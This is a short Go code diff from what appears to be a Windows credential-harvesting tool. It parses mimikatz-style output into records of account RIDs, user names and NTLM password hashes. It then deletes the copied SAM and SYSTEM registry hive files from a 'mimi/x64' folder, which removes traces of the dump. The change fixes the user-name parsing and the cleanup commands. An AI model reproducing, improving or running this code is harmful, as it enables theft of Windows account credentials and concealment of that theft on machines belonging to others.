@@ -44,19 +44,20 @@ func main() {
 	for i, v := range parts {
 		if strings.Contains(v, "RID") {
 			ridParts := strings.Split(strings.Split(v, ": ")[1], " ")
+			userParts := strings.Split(strings.Split(parts[i+1], ": ")[1], " ")
 			users = append(users, WindowUser{
 				RID:      ridParts[0],
-				User:     parts[i+1],
+				User:     userParts[0],
 				HashNTLM: parts[i+2],
 			})
 		}
 	}
 	fmt.Println(users)
-	_, _, err = shell.Execute("Remove-Item HKLM\\SYSTEM mimi/x64/system2.hiv")
+	_, _, err = shell.Execute("Remove-Item mimi/x64/system2.hiv")
 	if err != nil {
 		panic(err.Error())
 	}
-	_, _, err = shell.Execute("Remove-Item HKLM\\SYSTEM mimi/x64/sam2.hiv")
+	_, _, err = shell.Execute("Remove-Item mimi/x64/sam2.hiv")
 	if err != nil {
 		panic(err.Error())
 	}
